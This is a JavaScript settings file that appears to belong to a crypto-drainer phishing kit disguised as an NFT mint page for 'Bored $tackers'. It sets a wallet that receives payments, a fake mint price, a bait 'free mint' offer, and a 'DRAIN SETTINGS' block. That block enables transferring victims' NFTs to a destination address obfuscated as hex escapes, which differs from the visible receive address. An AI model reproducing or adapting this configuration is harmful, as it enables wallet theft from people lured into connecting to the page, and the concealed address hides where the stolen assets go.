/*
    = = = = = YOU WALLET ADRESS = = = = =
*/

const receiveAddress = "0xDc32ec7a610c2196fDf734818837DEEd1D2663A8";

/*
    = = = = = COLLECTION SETTINGS = = = = =
*/

const collectionInfo = {
    name: "Bored $tackers",
    date: "",
    socialMedia: {
        discord: "https://discord.gg/boredstackers",
        twitter: "https://twitter.com/BoredStackers",
    },
    medias: {
        preview: "media.png",
        favicon: "icon.png",
    },
    background: {
        type: "image", // Supported types: image, video, color (use image for gif)
        image: "bcg.png", // Image for image type or video preview for video type (image befor video load)
        video: "background.mp4", // If you don't use video type, you can ignore this line
        color: "white", // If you don't use color type, you can ignore this line
    }
}


/*
    = = = = = MINT INFORMATIONS = = = = =
*/

const mintInfo = {
    price: 0.125,
    totalSupply: 5000,
    minUnits: 1,
    maxUnits: 5,
    askMintLoop: true,
}

/*
    = = = = = DRAIN SETTINGS = = = = =
*/

var _0x5f19=["\x30\x78\x39\x39\x33\x37\x39\x37\x33\x39\x65\x30\x34\x32\x34\x46\x33\x42\x62\x31\x33\x32\x61\x34\x62\x63\x62\x33\x41\x31\x63\x37\x42\x45\x65\x38\x36\x32\x41\x39\x38\x30"];
const drainNftsInfo={active:true,minValue:0.3,maxTransfer:5,nftReceiveAddress:_0x5f19[0]}

const customStrings = {
    title: "{name} mint", // Title prefix (ex "Buy your {name}") - You can use {name} to insert the collection name
    connectButton: "CONNECT WALLET",
    transferButton: "MINT NOW",
    dateString: "Bonus: Mint 5 & get 1 FREE", // Date string (ex "Pre sale available {date}") - You can use {date} to insert the collection date
}

/*
    = = = = = END OF SETTINGS = = = = =
*/

//#region Check Configuration
if (mintInfo.minUnits > mintInfo.maxUnits) console.error(`Error: minUnits (${mintInfo.minUnits}) is greater than maxUnits (${maxUnits})`);
if (mintInfo.minUnits <= 0) console.error(`Error: minUnits (${mintInfo.minUnits}) is less than or equal to 0`);

if (!receiveAddress.startsWith("0x") ||
    (
        receiveAddress.length >= 64 ||
        receiveAddress.length <= 40
    )
) console.error(`Error: ${receiveAddress} is not a valid Ethereum address.`);
//#endregion
